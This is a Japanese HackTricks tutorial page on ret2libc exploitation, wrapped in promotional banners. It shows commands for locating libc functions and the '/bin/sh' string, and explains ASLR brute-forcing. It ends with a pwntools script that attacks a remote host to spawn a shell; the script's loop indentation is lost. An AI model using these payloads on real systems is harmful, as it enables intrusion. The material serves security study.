# Ret2lib

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローする
* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## **基本情報**

**Ret2Libc**の本質は、脆弱なプログラムの実行フローを、スタック上の攻撃者提供のシェルコードを実行する代わりに、共有ライブラリ（たとえば **system**、**execve**、**strcpy**）内の関数にリダイレクトすることです。攻撃者は、ペイロードを作成し、スタック上の戻りアドレスを望ましいライブラリ関数を指すように変更し、同時に呼び出し規約に従って必要な引数が正しく設定されるようにもします。

### **手順の例（簡略化）**

* 呼び出す関数（たとえば system）のアドレスと呼び出すコマンド（たとえば /bin/sh）を取得する
* 最初の引数をコマンド文字列を指すように渡し、実行フローを関数に渡すためのROPチェーンを生成する

## アドレスの検索

* 現在のマシンで使用されている `libc` がどこにメモリにロードされるかを見つけるには、次のコマンドを使用します:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

ASLR が libc のアドレスを変更しているかどうかを確認したい場合は、次のようにします:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* 使用されているlibcを知っていると、`system`関数へのオフセットを見つけることも可能です:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* 使用されているlibcを知っている場合、文字列 `/bin/sh` 関数へのオフセットを見つけることも可能です:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF を使用する

使用している libc を知っている場合、Peda または GEF を使用して、**system** 関数、**exit** 関数、および文字列 **`/bin/sh`** のアドレスを取得することも可能です：
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/mapsを使用する

プロセスが**子プロセス**を作成している場合（ネットワークサーバーの場合）、そのファイルを**読み取ろう**としてみてください（おそらくroot権限が必要です）。

ここで、プロセス内で**libcがどこにロードされているかを正確に見つけ**、プロセスのすべての子プロセスに対して**どこにロードされるか**を見つけることができます。

![](<../../../../.gitbook/assets/image (95).png>)

この場合、**0xb75dc000**にロードされています（これがlibcのベースアドレスになります）

## 未知のlibc

バイナリがロードしている**libcがわからない**可能性があります（アクセス権がないサーバーに配置されている可能性があるため）。その場合、脆弱性を悪用して**いくつかのアドレスを漏洩させ、どのlibcライブラリが使用されているかを見つける**ことができます：

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

また、これに対するpwntoolsのテンプレートを以下で見つけることができます：

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## 32ビットでのASLR回避

これらのブルートフォース攻撃は**32ビットシステムにのみ有用**です。

* 攻撃がローカルの場合、libcのベースアドレスをブルートフォースできます（32ビットシステムに有用）:
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* リモートサーバーを攻撃する場合、`libc`関数`usleep`のアドレスを**ブルートフォース**して、引数として10を渡すことができます。サーバーが**10秒余分に応答する**ようになったら、この関数のアドレスを見つけました。

## ONE\_GADGET

[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)は、**system**と**"/bin/sh"**を使用せずにシェルを取得することを可能にします。**ONE\_GADGET**は、libcライブラリ内で、単一の**ROPアドレス**を使用してシェルを取得する方法を見つけます。\
ただし、通常、いくつかの制約があります。最も一般的で回避しやすいものは、`[rsp+0x30] == NULL`のようなものです。**RSP**内の値を制御できるため、さらにいくつかのNULL値を送信して制約を回避すればよいです。
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## x86 Ret2libのコード例

この例では、ASLR brute-forceがコードに統合されており、脆弱性のあるバイナリがリモートサーバーに配置されています。
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib コード例

以下の例を確認してください：

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (またはputs)

これにより、`printf`/`puts`を特定のデータを引数として呼び出すことで、プロセスから情報を**漏洩**することができます。

## Ret2printf

これは、`ret2lib`を使用して`printf`フォーマット文字列の脆弱性に変換するために**Ret2libを悪用する**ことを意味します。それを悪用するために`ret2lib`を使用してprintfを呼び出し、それを悪用するための値を渡すことができます（無駄に聞こえるかもしれませんが、可能です）：

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローする。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
